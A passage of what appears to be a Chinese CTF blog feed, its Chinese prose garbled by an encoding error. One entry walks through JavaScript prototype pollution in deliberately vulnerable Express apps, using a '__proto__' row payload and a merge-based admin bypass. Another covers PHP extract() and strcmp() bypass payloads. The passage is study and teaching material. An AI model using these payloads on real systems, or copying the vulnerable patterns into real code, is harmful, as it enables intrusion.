class="hljs-params">undefined, importsValues</span>)</span>;&#125;);</code></pre><p>optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLå–åˆ°äº†å…¶<code>options.sourceURL</code>å±æ€§ã€‚è¿™ä¸ªå±æ€§åŸæœ¬æ˜¯æ²¡æœ‰èµ‹å€¼çš„ï¼Œé»˜è®¤å–ç©ºå­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¯ä»¥ç»™æ‰€æœ‰Objectå¯¹è±¡ä¸­éƒ½æ’å…¥ä¸€ä¸ª<code>sourceURL</code>å±æ€§ã€‚æœ€åï¼Œè¿™ä¸ª<code>sourceURL</code>è¢«æ‹¼æ¥è¿›<code>new Function</code>çš„ç¬¬äºŒä¸ªå‚æ•°ä¸­ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚å°†å¸¦æœ‰<code>__proto__</code>çš„Payloadä»¥jsonçš„å½¢å¼å‘é€ç»™åç«¯ï¼Œå› ä¸ºexpressæ¡†æ¶æ”¯æŒæ ¹æ®Content-Typeæ¥è§£æè¯·æ±‚Bodyï¼š</p><p><img src="/2021/04/18/js/3.png" alt="3"></p><p>è¿”å›äº†idå‘½ä»¤ã€‚</p><h3 id="hackit-2018"><a class="header-anchor" href="#hackit-2018">ğŸ­</a>hackit 2018</h3><p>æºç :</p><pre><code class="hljs yaml"><span class="hljs-string">const</span> <span class="hljs-string">express</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;express&#x27;)</span>         <span class="hljs-string">//å…³äºrequireï¼Œrequireæ˜¯ä¸€ä¸ªå‡½æ•°</span><span class="hljs-string">var</span> <span class="hljs-string">hbs</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;hbs&#x27;);</span><span class="hljs-string">var</span> <span class="hljs-string">bodyParser</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;body-parser&#x27;);</span><span class="hljs-string">const</span> <span class="hljs-string">md5</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;md5&#x27;);</span><span class="hljs-string">var</span> <span class="hljs-string">morganBody</span> <span class="hljs-string">=</span> <span class="hljs-string">require(&#x27;morgan-body&#x27;);</span><span class="hljs-string">const</span> <span class="hljs-string">app</span> <span class="hljs-string">=</span> <span class="hljs-string">express();</span><span class="hljs-string">var</span> <span class="hljs-string">user</span> <span class="hljs-string">=</span> []<span class="hljs-string">;</span> <span class="hljs-string">//empty</span> <span class="hljs-string">for</span> <span class="hljs-string">now</span><span class="hljs-string">var</span> <span class="hljs-string">matrix</span> <span class="hljs-string">=</span> []<span class="hljs-string">;</span><span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)&#123;</span>    <span class="hljs-string">matrix[i]</span> <span class="hljs-string">=</span> [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<span class="hljs-string">;</span><span class="hljs-string">&#125;</span><span class="hljs-string">function</span> <span class="hljs-string">draw(mat)</span> &#123;    <span class="hljs-string">var</span> <span class="hljs-string">count</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span>    <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;        <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">j</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">j</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">j++)</span>&#123;            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-string">j</span>] <span class="hljs-type">!==</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span>&#123;                <span class="hljs-string">count</span> <span class="hljs-string">+=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>            &#125;        &#125;    &#125;    <span class="hljs-string">return</span> <span class="hljs-string">count</span> <span class="hljs-string">===</span> <span class="hljs-number">9</span><span class="hljs-string">;</span>&#125;<span class="hljs-string">app.use(express.static(&#x27;public&#x27;));</span><span class="hljs-string">app.use(bodyParser.json());</span><span class="hljs-string">app.set(&#x27;view</span> <span class="hljs-string">engine&#x27;,</span> <span class="hljs-string">&#x27;html&#x27;</span><span class="hljs-string">);</span><span class="hljs-string">morganBody(app);</span><span class="hljs-string">app.engine(&#x27;html&#x27;,</span> <span class="hljs-string">require(&#x27;hbs&#x27;).__express);</span><span class="hljs-string">app.get(&#x27;/&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;    <span class="hljs-string">for</span> <span class="hljs-string">(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;        <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>] <span class="hljs-string">=</span> [<span class="hljs-literal">null</span> , <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<span class="hljs-string">;</span>    &#125;    <span class="hljs-string">res.render(&#x27;index&#x27;);</span>&#125;<span class="hljs-string">)</span><span class="hljs-string">app.get(&#x27;/admin&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;     <span class="hljs-string">/*this</span> <span class="hljs-string">is</span> <span class="hljs-string">under</span> <span class="hljs-string">development</span> <span class="hljs-string">I</span> <span class="hljs-string">guess</span> <span class="hljs-string">??*/</span>    <span class="hljs-string">console.log(user.admintoken);</span>    <span class="hljs-string">if(user.admintoken</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">req.query.querytoken</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">md5(user.admintoken)</span> <span class="hljs-string">===</span> <span class="hljs-string">req.query.querytoken)</span>&#123;        <span class="hljs-string">res.send(&#x27;Hey</span> <span class="hljs-string">admin</span> <span class="hljs-string">your</span> <span class="hljs-string">flag</span> <span class="hljs-string">is</span> <span class="hljs-string">&lt;b&gt;flag</span>&#123;<span class="hljs-string">prototype_pollution_is_very_dangerous</span>&#125;<span class="hljs-string">&lt;/b&gt;&#x27;);</span>    &#125;     <span class="hljs-string">else</span> &#123;        <span class="hljs-string">res.status(403).send(&#x27;Forbidden&#x27;);</span>    &#125;    &#125;<span class="hljs-string">)</span><span class="hljs-string">app.post(&#x27;/api&#x27;,</span> <span class="hljs-string">(req,</span> <span class="hljs-string">res)</span> <span class="hljs-string">=&gt;</span> &#123;    <span class="hljs-string">var</span> <span class="hljs-string">client</span> <span class="hljs-string">=</span> <span class="hljs-string">req.body;</span>    <span class="hljs-string">var</span> <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-literal">null</span><span class="hljs-string">;</span>    <span class="hljs-string">if</span> <span class="hljs-string">(client.row</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3</span> <span class="hljs-string">||</span> <span class="hljs-string">client.col</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">client.row</span> <span class="hljs-string">%=</span> <span class="hljs-number">3</span><span class="hljs-string">;</span>        <span class="hljs-string">client.col</span> <span class="hljs-string">%=</span> <span class="hljs-number">3</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">matrix</span>[<span class="hljs-string">client.row</span>][<span class="hljs-string">client.col</span>] <span class="hljs-string">=</span> <span class="hljs-string">client.data;</span>    <span class="hljs-string">for(var</span> <span class="hljs-string">i</span> <span class="hljs-string">=</span> <span class="hljs-number">0</span><span class="hljs-string">;</span> <span class="hljs-string">i</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">3</span><span class="hljs-string">;</span> <span class="hljs-string">i++)</span>&#123;        <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">2</span>] <span class="hljs-string">)</span>&#123;            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>            &#125;            <span class="hljs-string">else</span> <span class="hljs-string">if(matrix</span>[<span class="hljs-string">i</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>            &#125;        &#125;        <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-string">i</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-string">i</span>]<span class="hljs-string">)</span>&#123;            <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>            &#125;            <span class="hljs-string">else</span> <span class="hljs-string">if(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-string">i</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span> &#123;                <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>            &#125;        &#125;    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>    &#125;     <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;X&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">1</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(matrix</span>[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] <span class="hljs-string">===</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">matrix</span>[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] <span class="hljs-string">===</span> <span class="hljs-string">&#x27;O&#x27;</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">winner</span> <span class="hljs-string">=</span> <span class="hljs-number">2</span><span class="hljs-string">;</span>    &#125;    <span class="hljs-string">if</span> <span class="hljs-string">(draw(matrix)</span> <span class="hljs-string">&amp;&amp;</span> <span class="hljs-string">winner</span> <span class="hljs-string">===</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span>&#123;        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-number">0</span>&#125;<span class="hljs-string">))</span>    &#125;    <span class="hljs-string">else</span> <span class="hljs-string">if</span> <span class="hljs-string">(winner</span> <span class="hljs-type">!==</span> <span class="hljs-literal">null</span><span class="hljs-string">)</span> &#123;        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-string">winner</span>&#125;<span class="hljs-string">))</span>    &#125;    <span class="hljs-string">else</span> &#123;        <span class="hljs-string">res.send(JSON.stringify(</span>&#123;<span class="hljs-attr">winner:</span> <span class="hljs-number">-1</span>&#125;<span class="hljs-string">))</span>    &#125;&#125;<span class="hljs-string">)</span><span class="hljs-string">app.listen(3000,</span> <span class="hljs-string">()</span> <span class="hljs-string">=&gt;</span> &#123;    <span class="hljs-string">console.log(&#x27;app</span> <span class="hljs-string">listening</span> <span class="hljs-string">on</span> <span class="hljs-string">port</span> <span class="hljs-number">3000</span><span class="hljs-type">!&#x27;)</span>&#125;<span class="hljs-string">)</span></code></pre><p>è·å–flagçš„æ¡ä»¶ï¼š<code>user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken</code>ï¼Œæºç å¹¶æ²¡æœ‰ç»™user.admintokenèµ‹å€¼ã€‚ä½†æ˜¯åœ¨apiè¿™ä¸ªæ¥å£çš„åœ°æ–¹ï¼Œæ˜¯å¯ä»¥æ¥æ”¶dataï¼Œrowï¼Œcolæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p><pre><code class="hljs markdown">matrix[<span class="hljs-string">client.row</span>][<span class="hljs-symbol">client.col</span>] = client.data</code></pre><p>client.rowè®¾ç½®ä¸º<code>__proto__</code>å³å¯ï¼Œå†å°†colè®¾ä¸ºadmintokenï¼Œæ­¤æ—¶dataå°±æ˜¯æˆ‘ä»¬è®¾ç½®çš„å€¼äº†ã€‚</p><p>æ­¤æ—¶åœ¨adminè·¯ç”±å¤„ä¼ å…¥querytoken</p><p><img src="/2021/04/18/js/4.jpg" alt="4"></p><h4 id="demo3"><a class="header-anchor" href="#demo3">ğŸ­</a>demo3</h4><pre><code class="hljs javascript"><span class="hljs-meta">&#x27;use strict&#x27;</span>;<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<span class="hljs-keyword">const</span> isObject = <span class="hljs-function"><span class="hljs-params">obj</span> =&gt;</span> obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === <span class="hljs-built_in">Object</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">merge</span>(<span class="hljs-params">a, b</span>) </span>&#123;    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> attr <span class="hljs-keyword">in</span> b) &#123;        <span class="hljs-keyword">if</span> (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123;            merge(a[attr], b[attr]);        &#125; <span class="hljs-keyword">else</span> &#123;            a[attr] = b[attr];        &#125;    &#125;    <span class="hljs-keyword">return</span> a&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">a</span>) </span>&#123;    <span class="hljs-keyword">return</span> merge(&#123;&#125;, a);&#125;<span class="hljs-comment">// Constants</span><span class="hljs-keyword">const</span> PORT = <span class="hljs-number">8080</span>;<span class="hljs-keyword">const</span> HOST = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>;<span class="hljs-keyword">const</span> admin = &#123;&#125;;<span class="hljs-comment">// App</span><span class="hljs-keyword">const</span> app = express();app.use(bodyParser.json())app.use(cookieParser());app.use(<span class="hljs-string">&#x27;/&#x27;</span>, express.static(path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>)));app.post(<span class="hljs-string">&#x27;/signup&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">var</span> body = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.body));    <span class="hljs-keyword">var</span> copybody = clone(body)    <span class="hljs-keyword">if</span> (copybody.name) &#123;        res.cookie(<span class="hljs-string">&#x27;name&#x27;</span>, copybody.name).json(&#123;            <span class="hljs-string">&quot;done&quot;</span>: <span class="hljs-string">&quot;cookie set&quot;</span>        &#125;);    &#125; <span class="hljs-keyword">else</span> &#123;        res.json(&#123;            <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;cookie not set&quot;</span>        &#125;)    &#125;&#125;);app.get(<span class="hljs-string">&#x27;/getFlag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;    <span class="hljs-keyword">var</span> Ğ°dmin = <span class="hljs-built_in">JSON</span>.parse(<span class="hljs-built_in">JSON</span>.stringify(req.cookies))    <span class="hljs-keyword">if</span> (admin.Ğ°dmin == <span class="hljs-number">1</span>) &#123;        res.send(<span class="hljs-string">&quot;hackim19&#123;&#125;&quot;</span>);    &#125; <span class="hljs-keyword">else</span> &#123;        res.send(<span class="hljs-string">&quot;You are not authorized&quot;</span>);    &#125;&#125;);app.listen(PORT, HOST);<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Running on http://<span class="hljs-subst">$&#123;HOST&#125;</span>:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);</code></pre><p>è·å–flagçš„æ¡ä»¶æ˜¯<code>admin.Ğ°dmin == 1</code>è€Œadmin æœ¬èº«æ˜¯ä¸€ä¸ªobjectï¼Œå…¶admin å±æ€§æœ¬èº«å¹¶ä¸å­˜åœ¨ã€‚è¿˜ç”¨åˆ°äº†merge å‡½æ•°è¿›è¡Œå¯¹è±¡çš„åˆå¹¶ï¼Œä¸”æ¶‰åŠåˆ°äº†å¯¹è±¡çš„èµ‹å€¼ï¼Œé”®å€¼å¯æ§ï¼Œå¯ä»¥è§¦å‘åŸå½¢é“¾æ±¡æŸ“ã€‚</p><p>ä½†æœ¬é¢˜ä¸­æˆ‘ä»¬ä¸èƒ½ç›´æ¥å°†1èµ‹ç»™adminï¼Œå› ä¸ºåœ¨åˆ›å»ºå­—å…¸çš„æ—¶å€™ï¼Œ<code>__proto__</code>,ä¸æ˜¯ä½œä¸ºä¸€ä¸ªé”®åï¼Œè€Œæ˜¯å·²ç»ä½œä¸º<code>__proto__</code>ç»™å…¶çˆ¶ç±»è¿›è¡Œèµ‹å€¼äº†ï¼Œæ‰€ä»¥åœ¨<code>test.__proto__</code>ä¸­æ‰æœ‰adminå±æ€§ï¼Œä½†æˆ‘ä»¬æƒ³è®©<code>__proto__</code>ä½œä¸ºä¸€ä¸ªé”®å€¼ï¼Œæ­¤æ—¶éœ€è¦ç”¨åˆ°JSON.parseã€‚JSON.parse ä¼šæŠŠä¸€ä¸ªjsonå­—ç¬¦ä¸² è½¬åŒ–ä¸º javascriptçš„object</p><p><img src="/2021/04/18/js/5.jpg" alt="5"></p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>åŸå‹é“¾æ±¡æŸ“çš„ä¸€ä¸ªå…³é”®ç‚¹æ˜¯mergeå‡½æ•°ï¼Œåˆ©ç”¨ç‚¹é€šå¸¸éƒ½æ˜¯ç»™æœªèµ‹å€¼ä½†å¯èµ‹å€¼çš„å˜é‡è¿›è¡Œèµ‹å€¼ã€‚</p><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_45551083/article/details/109589386">åŸå‹é“¾æ±¡æŸ“æ¼æ´(ä¸€)</a></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡»</a></p><p><a href="https://www.anquanke.com/post/id/176884/#h3-5">JavaScript åŸå‹é“¾æ±¡æŸ“ </a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPå¼±ç±»å‹åŠç»•è¿‡</title>
    <link href="/2021/04/17/lowtype/"/>
    <url>/2021/04/17/lowtype/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a class="header-anchor" href="#å‰è¨€">ğŸ­</a>å‰è¨€</h2><p>PHPå¼±ç±»å‹åº”ç”¨æŒºå¤šçš„ï¼Œæ¥æ€»ç»“ä¸€ä¸‹ã€‚</p><p>æ¯”è¾ƒæ“ä½œç¬¦<code>==</code>ä¸<code>===</code>ï¼Œè¿™ä¸¤ç§éƒ½å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªæ•°å­—çš„å¤§å°ï¼Œä½†æ˜¯æœ‰å¾ˆæ˜æ˜¾çš„åŒºåˆ«ã€‚</p><table><thead><tr><th>æ“ä½œç¬¦</th><th>æè¿°</th></tr></thead><tbody><tr><td>==</td><td>æŠŠä¸¤ç«¯å˜é‡ç±»å‹è½¬æ¢æˆç›¸åŒçš„ï¼Œå†è¿›è¡Œæ¯”è¾ƒ</td></tr><tr><td>===</td><td>å…ˆåˆ¤æ–­ä¸¤ç«¯å˜é‡ç±»å‹æ˜¯å¦ç›¸åŒï¼Œå†è¿›è¡Œæ¯”è¾ƒ</td></tr></tbody></table><p><strong>æ³¨æ„</strong>ï¼šåœ¨ä¸¤ä¸ªç›¸ç­‰çš„ç¬¦å·ä¸­ï¼Œä¸€ä¸ªå­—ç¬¦ä¸²ä¸ä¸€ä¸ªæ•°å­—ç›¸æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²ä¼šè½¬æ¢æˆæ•°å€¼ã€‚</p><h2 id="extractå˜é‡è¦†ç›–"><a class="header-anchor" href="#extractå˜é‡è¦†ç›–">ğŸ­</a>extractå˜é‡è¦†ç›–</h2><blockquote><p><code>extract()</code> å‡½æ•°</p><blockquote><p>ä½¿ç”¨<strong>æ•°ç»„é”®å</strong>ä½œä¸º<strong>å˜é‡å</strong>ï¼Œä½¿ç”¨<strong>æ•°ç»„é”®å€¼</strong>ä½œä¸º<strong>å˜é‡å€¼</strong>ï¼Œå½“å˜é‡ä¸­æœ‰åŒåçš„å…ƒç´ æ—¶ï¼Œè¯¥å‡½æ•°é»˜è®¤å°†åŸæœ‰çš„å€¼ç»™è¦†ç›–æ‰ã€‚è¿™å°±é€ æˆäº†å˜é‡è¦†ç›–ã€‚</p></blockquote></blockquote><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag=<span class="hljs-string">&#x27;xxx&#x27;</span>;extract($_GET);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan)) &#123;$content=trim(file_get_contents($flag));<span class="hljs-keyword">if</span>($shiyan==$content) &#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;flag&#123;xxx&#125;&#x27;</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;Oh.no&#x27;</span>;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>extract()å‡½æ•°å°†GETæ–¹å¼è·å¾—çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­,ç„¶ååˆ¤æ–­<em>flag</em>å’Œshiyanä¸¤ä¸ªå˜é‡çš„å†…å®¹æ˜¯å¦ç›¸ç­‰ã€‚</p><pre><code class="hljs dts"><span class="hljs-symbol">Payload:</span>?flag=<span class="hljs-variable">&amp;shiyan</span>=</code></pre><p>flagå’Œshiyanè¿™ä¸¤ä¸ªå˜é‡çš„å†…å®¹éƒ½ä¼šè¢«è®¾ç½®æˆç©ºå­—ç¬¦ä¸²ã€‚è¿™æ ·,å°±æ»¡è¶³shiyan==contentçš„æ¡ä»¶ï¼Œå¾—åˆ°flagã€‚</p><h2 id="strcmpæ¯”è¾ƒå­—ç¬¦ä¸²"><a class="header-anchor" href="#strcmpæ¯”è¾ƒå­—ç¬¦ä¸²">ğŸ­</a>strcmpæ¯”è¾ƒå­—ç¬¦ä¸²</h2><blockquote><p>strcmp()</p><blockquote><p><code>strcmp(string1,string2)</code></p><blockquote><p>æ¯”è¾ƒå¤§å°ï¼Œè‹¥è¿”å›0,ä»£è¡¨ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ ï¼›è‹¥è¿”å›&lt;0 ,ä»£è¡¨string1 å°äº string2ï¼›è‹¥è¿”å›&gt;0ï¼Œä»£è¡¨string1 å¤§äº string2ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</p></blockquote></blockquote></blockquote><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$flag = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">&#x27;a&#x27;</span>], $flag) == <span class="hljs-number">0</span>)     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.$flag);     <span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>å¯¹äºä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œstrcmpå‡½æ•°ä¼šæŠ¥é”™ï¼Œå°†return 0 ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚æ‰€ä»¥strcmp()åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ç›´æ¥è¿”å›0ï¼Œè¿™æ ·é€šè¿‡æŠŠç›®æ ‡å˜é‡è®¾ç½®æˆæ•°ç»„å°±å¯ä»¥ç»•è¿‡è¯¥å‡½æ•°çš„é™åˆ¶ã€‚</p><pre><code class="hljs php">Payload:?a[]=<span class="hljs-number">123</span></code></pre><h2 id="urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡"><a class="header-anchor" href="#urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡">ğŸ­</a>urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡</h2><p>demoï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">&quot;hackerDJ&quot;</span>,$_GET[id])) &#123;<span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;not 